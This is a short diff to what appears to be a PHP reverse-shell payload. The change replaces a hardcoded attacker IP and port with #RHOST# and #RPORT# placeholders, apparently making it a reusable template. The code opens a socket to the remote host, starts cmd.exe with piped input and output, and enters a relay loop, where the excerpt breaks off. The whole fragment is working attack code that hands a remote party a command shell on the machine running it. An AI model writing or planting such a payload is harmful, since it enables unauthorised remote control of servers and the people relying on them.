@@ -1,6 +1,6 @@
 <?php
     set_time_limit (0);
-    $sock=fsockopen("10.11.9.200",443);
+    $sock=fsockopen("#RHOST#",#RPORT#);
     $pfd=array(0 => array("pipe","r"),1 => array("pipe","w"),2 => array("pipe","w"));
     $proc = proc_open("cmd.exe 2>&1", $pfd, $pipes);
     while(1) {
